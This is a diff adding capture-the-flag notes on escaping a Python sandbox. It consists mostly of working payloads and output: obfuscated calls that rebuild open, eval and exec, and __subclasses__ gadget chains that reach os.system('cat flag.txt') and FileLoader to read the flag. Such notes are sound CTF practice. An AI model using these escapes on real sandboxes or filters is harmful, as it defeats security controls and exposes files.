@@ -99,3 +99,41 @@ print(getattr(escape.get_function(o+p+e+n)(f+l+a+g+dot+t+x+t),r+e+a+d)())
   limits prevent trivial approaches while maintaining solvability through sophisticated techniques.
 
 print(getattr(getattr(__builtins__,"op".__add__("en"))("fl".__add__("ag"),'r'),"re".__add__("ad"))())
+
+
+print(escape.get_function("{0}{1}".format("op", "en")))
+kw = "{0}{1}".format("op", "en");print(escape.get_function(kw))
+>>> print(escape.get_function())
+[!] Error: TypeError: get_strategic_builtins.<locals>.Escape.get_function() missing 1 required positional argument: 'name'
+>>> print(escape.get_function('\u006f\u0070\u0065\u006e'))
+[!] Suspicious pattern detected
+>>> print(escape.get_function("{}{}{}{}".format("o", "p", "e", "n")))
+<built-in function open>
+>>> print(escape.get_function("{}{}{}{}".format("e", "v", "a", "l")))
+<built-in function eval>
+>>> print(escape.get_function("{}{}{}{}".format("e", "x", "e", "c")))
+<built-in function exec>
+>>>
+
+open_str="{}{}{}{}".format("o","p","e","n");open_func=escape.get_function(open_str);fn="{}{}{}{}{}{}{}{}".format("f","l","a","g",".","t","x","t");read_str="{}{}{}{}".format("r","e","a","d");file_obj=open_func(fn,"r");read_func=getattr(file_obj,read_str);print(read_func())
+
+a = print("".__dir__())
+
+().__class__.__bases__[0].__subclasses__()[107]().load_module("os").system("cat flag.txt")
+
+obj=(()).__class__.__bases__[0].__subclasses__()[120]();os_mod=obj.load_module('o'+'s');method_name=''.join(map(chr,[115,121,115,116,101,109]));getter=type(os_mod).__getattribute__;cmd='type flag.txt';getter(os_mod,method_name)(cmd)
+
+
+print([(i, cls) for i, cls in enumerate((()).__class__.__bases__[0].__subclasses__()) if 'BuiltinImporter' in str(cls)])
+
+
+BuiltinImporter
+
+subs=(()).__class__.__bases__[0].__subclasses__();print(len(subs))
+
+_=(lambda:((()).__class__.__bases__[0].__subclasses__()))();print([str(c) for c in _[130:140]])
+
+>>> loader=(()).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt');method_name=''.join(map(chr,[103,101,116,95,100,97,116,97]));getter=type(loader).__getattribute__;data=getter(loader,method_name)('flag.txt');print(data)
+b'BCTF{0x5n34ky_py7h0n_35c4p3}'
+>>> print([(i, cls) for i, cls in enumerate((()).__class__.__bases__[0].__subclasses__()) if 'FileLoader' in str(cls)])
+[(135, <class '_frozen_importlib_external.FileLoader'>)]
